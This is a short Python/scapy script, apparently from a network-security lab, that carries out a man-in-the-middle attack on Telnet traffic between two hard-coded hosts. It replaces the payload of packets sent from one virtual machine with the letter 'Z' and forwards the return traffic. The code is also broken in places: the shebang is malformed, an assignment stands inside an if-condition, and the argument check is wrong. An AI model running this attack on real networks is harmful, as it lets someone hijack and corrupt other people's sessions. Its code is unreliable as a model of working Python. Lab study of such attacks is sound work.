#/usr/bin/python3
from scapy.all import *
import sys

if len(sys.argv) > 3:
	sys.exit('Usage: sudo python3 task2-mitm.py [VM A] [VM B]')

SELF_MAC='08:00:27:bc:f5:3d'
A_MAC= '08:00:27:ed:2d:85'

def spoof_pkt(pkt):
	if pkt[IP].src==sys.argv[1] and pkt[IP].dst==sys.argv[2] and pkt[TCP].payload and pkt[Ether].src=A_MAC:
		I = IP(bytes(pkt[IP]))
		del(I[IP].chksum) 
		del(I[TCP].chksum)
		del(I[TCP].payload)
		newdata='Z'.encode()
		newpkt=I/newdata
		#newpkt.show2()
		send(newpkt)
		
	elif pkt[IP].src == sys.argv[2] and pkt[IP].dst == sys.argv[1]:
		send(pkt[IP]) # Forward the original packet

if __name__ == '__main__':
	# spoof
	sniff(filter='tcp and port 23 and host 10.0.2.7 and host 10.0.2.9',prn=spoof_pkt)
